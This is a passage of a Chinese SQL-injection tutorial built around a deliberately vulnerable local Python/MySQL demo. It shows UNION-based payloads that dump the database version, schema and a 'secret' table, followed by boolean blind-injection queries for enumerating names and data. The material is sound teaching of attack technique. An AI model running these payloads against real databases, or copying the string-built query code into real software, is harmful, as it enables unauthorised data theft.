<span class="line"><span style="color:#D73A49;">if</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">__name__</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">==</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;__main__&quot;</span><span style="color:#24292E;">:</span></span>
<span class="line"><span style="color:#24292E;">    main()</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br></div></div><p>接下来我们进行一次常规查询</p><p><img src="https://cdn.xyxsw.site/boxcnpCCmEi6LIKNi0UqEkXfJ8g.png" alt=""></p><p>可以看到我们成功从数据库中查出了 <code>username</code> 和 <code>password</code> ，并显示在返回中</p><p>现在我们构造一些恶意语句，比如 <code>123&#39; UNION SELECT 1, 2;#</code></p><p>现在我们将执行的语句打印出来看看，对代码进行一些小改动</p><div class="language-bash vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#79B8FF;">...</span></span>
<span class="line"><span style="color:#B392F0;">def</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">query</span><span style="color:#E1E4E8;">(</span><span style="color:#B392F0;">username</span><span style="color:#E1E4E8;">)</span><span style="color:#9ECBFF;">:</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#B392F0;">with</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">engine.connect</span><span style="color:#E1E4E8;">() </span><span style="color:#9ECBFF;">as</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">con:</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#B392F0;">query_exec</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">f&quot;SELECT * FROM users WHERE username = &#39;{username}&#39;&quot;</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#79B8FF;">print</span><span style="color:#E1E4E8;">(query_exec)</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#B392F0;">cur</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">con.execute</span><span style="color:#E1E4E8;">(</span><span style="color:#B392F0;">query_exec</span><span style="color:#E1E4E8;">)</span><span style="color:#9ECBFF;">.cursor</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#B392F0;">x</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">from_db_cursor</span><span style="color:#E1E4E8;">(</span><span style="color:#B392F0;">cur</span><span style="color:#E1E4E8;">)</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#F97583;">return</span><span style="color:#E1E4E8;">(x)</span></span>
<span class="line"><span style="color:#79B8FF;">...</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#005CC5;">...</span></span>
<span class="line"><span style="color:#6F42C1;">def</span><span style="color:#24292E;"> </span><span style="color:#032F62;">query</span><span style="color:#24292E;">(</span><span style="color:#6F42C1;">username</span><span style="color:#24292E;">)</span><span style="color:#032F62;">:</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#6F42C1;">with</span><span style="color:#24292E;"> </span><span style="color:#032F62;">engine.connect</span><span style="color:#24292E;">() </span><span style="color:#032F62;">as</span><span style="color:#24292E;"> </span><span style="color:#032F62;">con:</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#6F42C1;">query_exec</span><span style="color:#24292E;"> </span><span style="color:#032F62;">=</span><span style="color:#24292E;"> </span><span style="color:#032F62;">f&quot;SELECT * FROM users WHERE username = &#39;{username}&#39;&quot;</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#005CC5;">print</span><span style="color:#24292E;">(query_exec)</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#6F42C1;">cur</span><span style="color:#24292E;"> </span><span style="color:#032F62;">=</span><span style="color:#24292E;"> </span><span style="color:#032F62;">con.execute</span><span style="color:#24292E;">(</span><span style="color:#6F42C1;">query_exec</span><span style="color:#24292E;">)</span><span style="color:#032F62;">.cursor</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#6F42C1;">x</span><span style="color:#24292E;"> </span><span style="color:#032F62;">=</span><span style="color:#24292E;"> </span><span style="color:#032F62;">from_db_cursor</span><span style="color:#24292E;">(</span><span style="color:#6F42C1;">cur</span><span style="color:#24292E;">)</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#D73A49;">return</span><span style="color:#24292E;">(x)</span></span>
<span class="line"><span style="color:#005CC5;">...</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p><img src="https://cdn.xyxsw.site/boxcnbaW15gnJc1O9Iv9WXqJxPc.png" alt=""></p><p>可以看到，实际执行的语句为</p><div class="language-sql vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">SELECT</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">*</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">FROM</span><span style="color:#E1E4E8;"> users </span><span style="color:#F97583;">WHERE</span><span style="color:#E1E4E8;"> username </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&#39;123&#39;</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">UNION</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">SELECT</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">1</span><span style="color:#E1E4E8;">, </span><span style="color:#79B8FF;">2</span><span style="color:#E1E4E8;">;#</span><span style="color:#9ECBFF;">&#39;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">SELECT</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">*</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">FROM</span><span style="color:#24292E;"> users </span><span style="color:#D73A49;">WHERE</span><span style="color:#24292E;"> username </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&#39;123&#39;</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">UNION</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">SELECT</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">1</span><span style="color:#24292E;">, </span><span style="color:#005CC5;">2</span><span style="color:#24292E;">;#</span><span style="color:#032F62;">&#39;</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><p>也就是说，在这个 demo 中，从数据库查询的内容会直接返回给用户，用户可以直接看到查询的内容</p><p>那我们是否可以进行一些其他的查询呢</p><p>构造语句 <code>123&#39; UNION SELECT DATABASE(), @@version;#</code></p><p><img src="https://cdn.xyxsw.site/boxcnDeDp5yPE7W4KX9ByBl9ovh.png" alt=""></p><p>我们就能看到返回中包含了当前数据库名与当前数据库版本</p><p>如果数据库中除了 <code>users</code> 表还有其他的东西，我们是否能通过这个注入来获取呢...</p><p>构造语句 <code>123&#39; UNION SELECT table_name, column_name FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = DATABASE();#</code></p><blockquote><p><code>information_schema</code> 库是一个 MySQL 内置数据库，储存了数据库中的一些基本信息，比如数据库名，表名，列名等一系列关键数据，SQL 注入中可以查询该库来获取数据库中的敏感信息。</p></blockquote><p><img src="https://cdn.xyxsw.site/boxcnkwvSnhKBhlHNLOSthgul9d.png" alt=""></p><p>我们可以发现，当前数据库中还存在一张叫 <code>secret</code> 的表，让我们偷看一下里面存的是什么</p><p>构造语句 <code>123&#39; UNION SELECT 1, secret_string FROM secret;#</code></p><p><img src="https://cdn.xyxsw.site/boxcn3kfhJ79ByNML2Z1Q1MwRye.png" alt=""></p><p>好像得到了什么不得了的秘密 😃</p><h3 id="无回显的-sql-盲注" tabindex="-1">无回显的 SQL 盲注 <a class="header-anchor" href="#无回显的-sql-盲注" aria-label="Permalink to &quot;无回显的 SQL 盲注&quot;">​</a></h3><h4 id="布尔盲注" tabindex="-1">布尔盲注 <a class="header-anchor" href="#布尔盲注" aria-label="Permalink to &quot;布尔盲注&quot;">​</a></h4><p>我们对有回显的 SQL 注入的 demo 进行一点修改，代码如下</p><div class="language-python vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">python</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#6A737D;">#!/usr/bin/python</span></span>
<span class="line"><span style="color:#6A737D;"># -*- coding: UTF-8 -*-</span></span>
<span class="line"></span>
<span class="line"><span style="color:#F97583;">from</span><span style="color:#E1E4E8;"> sqlalchemy </span><span style="color:#F97583;">import</span><span style="color:#E1E4E8;"> create_engine</span></span>
<span class="line"><span style="color:#F97583;">from</span><span style="color:#E1E4E8;"> hashlib </span><span style="color:#F97583;">import</span><span style="color:#E1E4E8;"> sha256</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8;">engine </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> create_engine(</span><span style="color:#9ECBFF;">&quot;mysql+pymysql://root:TjsDgwGPz5ANbJUU@127.0.0.1:3305/sqli&quot;</span><span style="color:#E1E4E8;">, </span><span style="color:#FFAB70;">max_overflow</span><span style="color:#F97583;">=</span><span style="color:#79B8FF;">5</span><span style="color:#E1E4E8;">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#F97583;">def</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">query</span><span style="color:#E1E4E8;">(username, password):</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">with</span><span style="color:#E1E4E8;"> engine.connect() </span><span style="color:#F97583;">as</span><span style="color:#E1E4E8;"> con:</span></span>
<span class="line"><span style="color:#E1E4E8;">        query_exec </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">f</span><span style="color:#9ECBFF;">&quot;SELECT password FROM users WHERE username = &#39;</span><span style="color:#79B8FF;">{</span><span style="color:#E1E4E8;">username</span><span style="color:#79B8FF;">}</span><span style="color:#9ECBFF;">&#39;&quot;</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#79B8FF;">print</span><span style="color:#E1E4E8;">(query_exec)</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#F97583;">if</span><span style="color:#E1E4E8;"> con.execute(query_exec).scalar():</span></span>
<span class="line"><span style="color:#E1E4E8;">            passhash </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> con.execute(query_exec).fetchone()[</span><span style="color:#79B8FF;">0</span><span style="color:#E1E4E8;">]</span></span>
<span class="line"><span style="color:#E1E4E8;">            </span><span style="color:#F97583;">return</span><span style="color:#E1E4E8;"> passhash </span><span style="color:#F97583;">==</span><span style="color:#E1E4E8;"> sha256(password.encode()).hexdigest()</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#F97583;">return</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">False</span></span>
<span class="line"></span>
<span class="line"><span style="color:#F97583;">def</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">main</span><span style="color:#E1E4E8;">():</span></span>
<span class="line"><span style="color:#E1E4E8;">    username </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">input</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&quot;Give me your username: &quot;</span><span style="color:#E1E4E8;">)</span></span>
<span class="line"><span style="color:#E1E4E8;">    password </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">input</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&quot;Give me your password: &quot;</span><span style="color:#E1E4E8;">)</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#79B8FF;">print</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&quot;Login success&quot;</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">if</span><span style="color:#E1E4E8;"> query(username, password) </span><span style="color:#F97583;">else</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;Login failed&quot;</span><span style="color:#E1E4E8;">)</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#6A737D;"># 不再显示查询结果，而返回 success 或 failed</span></span>
<span class="line"></span>
<span class="line"><span style="color:#F97583;">if</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">__name__</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">==</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;__main__&quot;</span><span style="color:#E1E4E8;">:</span></span>
<span class="line"><span style="color:#E1E4E8;">    main()</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#6A737D;">#!/usr/bin/python</span></span>
<span class="line"><span style="color:#6A737D;"># -*- coding: UTF-8 -*-</span></span>
<span class="line"></span>
<span class="line"><span style="color:#D73A49;">from</span><span style="color:#24292E;"> sqlalchemy </span><span style="color:#D73A49;">import</span><span style="color:#24292E;"> create_engine</span></span>
<span class="line"><span style="color:#D73A49;">from</span><span style="color:#24292E;"> hashlib </span><span style="color:#D73A49;">import</span><span style="color:#24292E;"> sha256</span></span>
<span class="line"></span>
<span class="line"><span style="color:#24292E;">engine </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> create_engine(</span><span style="color:#032F62;">&quot;mysql+pymysql://root:TjsDgwGPz5ANbJUU@127.0.0.1:3305/sqli&quot;</span><span style="color:#24292E;">, </span><span style="color:#E36209;">max_overflow</span><span style="color:#D73A49;">=</span><span style="color:#005CC5;">5</span><span style="color:#24292E;">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#D73A49;">def</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">query</span><span style="color:#24292E;">(username, password):</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">with</span><span style="color:#24292E;"> engine.connect() </span><span style="color:#D73A49;">as</span><span style="color:#24292E;"> con:</span></span>
<span class="line"><span style="color:#24292E;">        query_exec </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">f</span><span style="color:#032F62;">&quot;SELECT password FROM users WHERE username = &#39;</span><span style="color:#005CC5;">{</span><span style="color:#24292E;">username</span><span style="color:#005CC5;">}</span><span style="color:#032F62;">&#39;&quot;</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#005CC5;">print</span><span style="color:#24292E;">(query_exec)</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#D73A49;">if</span><span style="color:#24292E;"> con.execute(query_exec).scalar():</span></span>
<span class="line"><span style="color:#24292E;">            passhash </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> con.execute(query_exec).fetchone()[</span><span style="color:#005CC5;">0</span><span style="color:#24292E;">]</span></span>
<span class="line"><span style="color:#24292E;">            </span><span style="color:#D73A49;">return</span><span style="color:#24292E;"> passhash </span><span style="color:#D73A49;">==</span><span style="color:#24292E;"> sha256(password.encode()).hexdigest()</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#D73A49;">return</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">False</span></span>
<span class="line"></span>
<span class="line"><span style="color:#D73A49;">def</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">main</span><span style="color:#24292E;">():</span></span>
<span class="line"><span style="color:#24292E;">    username </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">input</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&quot;Give me your username: &quot;</span><span style="color:#24292E;">)</span></span>
<span class="line"><span style="color:#24292E;">    password </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">input</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&quot;Give me your password: &quot;</span><span style="color:#24292E;">)</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#005CC5;">print</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&quot;Login success&quot;</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">if</span><span style="color:#24292E;"> query(username, password) </span><span style="color:#D73A49;">else</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;Login failed&quot;</span><span style="color:#24292E;">)</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#6A737D;"># 不再显示查询结果，而返回 success 或 failed</span></span>
<span class="line"></span>
<span class="line"><span style="color:#D73A49;">if</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">__name__</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">==</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;__main__&quot;</span><span style="color:#24292E;">:</span></span>
<span class="line"><span style="color:#24292E;">    main()</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br></div></div><p>这样一来我们就只能知道自己是否登录成功，并不能看到查询返回的结果了</p><p><img src="https://cdn.xyxsw.site/boxcn2seUNESHkLC9PYvDp0vFbe.png" alt=""></p><p>那也就是说，我们无法直观地查看数据库中的数据了，即便查出了不该查的也看不到了 😦</p><p>那有没有什么办法击破这个限制呢？是时候该本章的主角，布尔盲注出场了</p><p>观察程序的逻辑，如果查询特定用户的密码与用户的输入匹配，则登陆成功，否则登陆失败</p><p>我们是否能控制语句是否将对应用户的密码查询出来呢？</p><p>在 MySQL 中有一种格式为 <code>if(expression, if_true, if_false)</code> 的分支语句</p><p>类比 Python 则可以写成</p><div class="language-python vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">python</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">if</span><span style="color:#E1E4E8;"> (expression):</span></span>
<span class="line"><span style="color:#E1E4E8;">    if_true</span></span>
<span class="line"><span style="color:#F97583;">else</span><span style="color:#E1E4E8;">:</span></span>
<span class="line"><span style="color:#E1E4E8;">    if_false</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">if</span><span style="color:#24292E;"> (expression):</span></span>
<span class="line"><span style="color:#24292E;">    if_true</span></span>
<span class="line"><span style="color:#D73A49;">else</span><span style="color:#24292E;">:</span></span>
<span class="line"><span style="color:#24292E;">    if_false</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>如果我们可以通过 <code>if</code> 语句来控制整个 SQL 语句是否查询成功，不就可以获取一些信息了吗？</p><p>当 if 语句为真时才将对应用户的密码查询出来，这样一来就能够通过用户验证，结果即为登陆成功</p><p>当 if 语句为假时则不将对应用户的密码查询出来，程序无从比对，也就无法通过用户验证了</p><p>有点抽象？没关系继续往下看。</p><p>构造语句 <code>Liki4&#39; and if(@@version rlike &#39;^5&#39;,1,0);#</code></p><blockquote><p>rlike 是 MySQL 中的一个关键字，是 regex 和 like 的结合体</p></blockquote><p><img src="https://cdn.xyxsw.site/boxcnJEeAKow3ZhUSvbL4FQXxOh.png" alt=""></p><p>这里实际执行的语句就变成了</p><div class="language-sql vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">SELECT</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">password</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">FROM</span><span style="color:#E1E4E8;"> users </span><span style="color:#F97583;">WHERE</span><span style="color:#E1E4E8;"> username </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&#39;Liki4&#39;</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">AND</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">if</span><span style="color:#E1E4E8;">(@@</span><span style="color:#F97583;">version</span><span style="color:#E1E4E8;"> rlike </span><span style="color:#9ECBFF;">&#39;^5&#39;</span><span style="color:#E1E4E8;">,</span><span style="color:#79B8FF;">1</span><span style="color:#E1E4E8;">,</span><span style="color:#79B8FF;">0</span><span style="color:#E1E4E8;">);</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">SELECT</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">password</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">FROM</span><span style="color:#24292E;"> users </span><span style="color:#D73A49;">WHERE</span><span style="color:#24292E;"> username </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&#39;Liki4&#39;</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">AND</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">if</span><span style="color:#24292E;">(@@</span><span style="color:#D73A49;">version</span><span style="color:#24292E;"> rlike </span><span style="color:#032F62;">&#39;^5&#39;</span><span style="color:#24292E;">,</span><span style="color:#005CC5;">1</span><span style="color:#24292E;">,</span><span style="color:#005CC5;">0</span><span style="color:#24292E;">);</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.xyxsw.site/boxcnJ3jImTQcMUOWJclTACj74e.png" alt=""></p><div class="language-sql vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">SELECT</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">password</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">FROM</span><span style="color:#E1E4E8;"> users </span><span style="color:#F97583;">WHERE</span><span style="color:#E1E4E8;"> username </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&#39;Liki4&#39;</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">AND</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">if</span><span style="color:#E1E4E8;">(@@</span><span style="color:#F97583;">version</span><span style="color:#E1E4E8;"> rlike </span><span style="color:#9ECBFF;">&#39;^8&#39;</span><span style="color:#E1E4E8;">,</span><span style="color:#79B8FF;">1</span><span style="color:#E1E4E8;">,</span><span style="color:#79B8FF;">0</span><span style="color:#E1E4E8;">);</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">SELECT</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">password</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">FROM</span><span style="color:#24292E;"> users </span><span style="color:#D73A49;">WHERE</span><span style="color:#24292E;"> username </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&#39;Liki4&#39;</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">AND</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">if</span><span style="color:#24292E;">(@@</span><span style="color:#D73A49;">version</span><span style="color:#24292E;"> rlike </span><span style="color:#032F62;">&#39;^8&#39;</span><span style="color:#24292E;">,</span><span style="color:#005CC5;">1</span><span style="color:#24292E;">,</span><span style="color:#005CC5;">0</span><span style="color:#24292E;">);</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.xyxsw.site/boxcnEDPFbKQ6iaM5WhHWUWmI5d.png" alt=""></p><p>也就是说，当 if 语句中的条件为真时，这个查询才会将 password 查询出来</p><p>如果 if 语句为假，这个条件为假的查询就不成立，查询的结果也为空了</p><p>从上面这个例子里我们就可以得出当前 MySQL 为 MySQL 5</p><p>如此一来我们就可以通过枚举爆破得到数据库名，表名，列名，进而得到数据库中存储的数据了</p><p>其中关键的语句如下</p><div class="language-sql vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">if</span><span style="color:#E1E4E8;">(</span><span style="color:#F97583;">DATABASE</span><span style="color:#E1E4E8;">() rlike </span><span style="color:#9ECBFF;">&#39;^{exp}&#39;</span><span style="color:#E1E4E8;">,</span><span style="color:#79B8FF;">1</span><span style="color:#E1E4E8;">,</span><span style="color:#79B8FF;">0</span><span style="color:#E1E4E8;">) # 获取数据库名</span></span>
<span class="line"><span style="color:#F97583;">if</span><span style="color:#E1E4E8;">((</span><span style="color:#F97583;">SELECT</span><span style="color:#E1E4E8;"> GROUP_CONCAT(table_name, </span><span style="color:#9ECBFF;">&#39;:&#39;</span><span style="color:#E1E4E8;">, column_name) </span><span style="color:#F97583;">FROM</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">information_schema</span><span style="color:#E1E4E8;">.</span><span style="color:#79B8FF;">COLUMNS</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">WHERE</span><span style="color:#E1E4E8;"> TABLE_SCHEMA </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">DATABASE</span><span style="color:#E1E4E8;">()) rlike </span><span style="color:#9ECBFF;">&#39;^{exp}&#39;</span><span style="color:#E1E4E8;">,</span><span style="color:#79B8FF;">1</span><span style="color:#E1E4E8;">,</span><span style="color:#79B8FF;">0</span><span style="color:#E1E4E8;">) # 获取表名与字段名</span></span>
<span class="line"><span style="color:#F97583;">if</span><span style="color:#E1E4E8;">((</span><span style="color:#F97583;">SELECT</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">binary</span><span style="color:#E1E4E8;"> GROUP_CONCAT(secret_string) </span><span style="color:#F97583;">FROM</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">secret</span><span style="color:#E1E4E8;">) rlike </span><span style="color:#9ECBFF;">&#39;^{exp}&#39;</span><span style="color:#E1E4E8;">,</span><span style="color:#79B8FF;">1</span><span style="color:#E1E4E8;">,</span><span style="color:#79B8FF;">0</span><span style="color:#E1E4E8;">) # 获取存储的数据</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">if</span><span style="color:#24292E;">(</span><span style="color:#D73A49;">DATABASE</span><span style="color:#24292E;">() rlike </span><span style="color:#032F62;">&#39;^{exp}&#39;</span><span style="color:#24292E;">,</span><span style="color:#005CC5;">1</span><span style="color:#24292E;">,</span><span style="color:#005CC5;">0</span><span style="color:#24292E;">) # 获取数据库名</span></span>
<span class="line"><span style="color:#D73A49;">if</span><span style="color:#24292E;">((</span><span style="color:#D73A49;">SELECT</span><span style="color:#24292E;"> GROUP_CONCAT(table_name, </span><span style="color:#032F62;">&#39;:&#39;</span><span style="color:#24292E;">, column_name) </span><span style="color:#D73A49;">FROM</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">information_schema</span><span style="color:#24292E;">.</span><span style="color:#005CC5;">COLUMNS</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">WHERE</span><span style="color:#24292E;"> TABLE_SCHEMA </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">DATABASE</span><span style="color:#24292E;">()) rlike </span><span style="color:#032F62;">&#39;^{exp}&#39;</span><span style="color:#24292E;">,</span><span style="color:#005CC5;">1</span><span style="color:#24292E;">,</span><span style="color:#005CC5;">0</span><span style="color:#24292E;">) # 获取表名与字段名</span></span>
